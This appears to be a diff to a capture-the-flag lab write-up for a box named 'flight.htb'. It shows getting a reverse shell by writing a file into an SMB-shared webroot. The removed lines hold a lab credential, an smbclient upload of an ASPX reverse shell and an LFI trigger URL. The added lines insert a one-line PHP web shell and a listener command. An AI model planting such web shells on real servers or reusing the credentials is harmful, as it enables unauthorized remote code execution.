@@ -498,39 +498,22 @@ SMB         10.129.228.120  445    G0               Web             READ,WRITE
 Now i have write access on `Web` which as previously identified is where the webroot is held so i should be able to make a reverse shell as this user
 
 # Reverse shell as `svc_apache`
-https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
-Ill use the shell at this link
+```python
+<?php system($_REQUEST['cmd']); ?>
+```
+Since i know the page is running PHP i will start with this!
 
 ```python
 penelope -p 1337                                      
 [+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
-This set me a listener
+This set me a listener ready for a reverse shell
 
 ```python
-smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'          
-Try "help" to get a list of possible commands.
-smb: \> cd school.flight.htb\
-smb: \school.flight.htb\> ls
-  .                                   D        0  Wed Apr  1 01:12:00 2026
-  ..                                  D        0  Wed Apr  1 01:12:00 2026
-  about.html                          A     1689  Tue Oct 25 04:54:45 2022
-  blog.html                           A     3618  Tue Oct 25 04:53:59 2022
-  home.html                           A     2683  Tue Oct 25 04:56:58 2022
-  images                              D        0  Wed Apr  1 01:12:00 2026
-  index.php                           A     2092  Thu Oct 27 08:59:25 2022
-  lfi.html                            A      179  Thu Oct 27 08:55:16 2022
-  styles                              D        0  Wed Apr  1 01:12:00 2026
 
-		5056511 blocks of size 4096. 1245550 blocks available
-smb: \school.flight.htb\> put shell.aspx
-putting file shell.aspx as \school.flight.htb\shell.aspx (1394.3 kB/s) (average 1394.3 kB/s)
-smb: \school.flight.htb\>  
 ```
-This planted the shell at the root of `http://school.flight.htb/`
 
-Now if i access `http://school.flight.htb/index.php?view=shell.aspx` it should trigger a shell
 
 
 
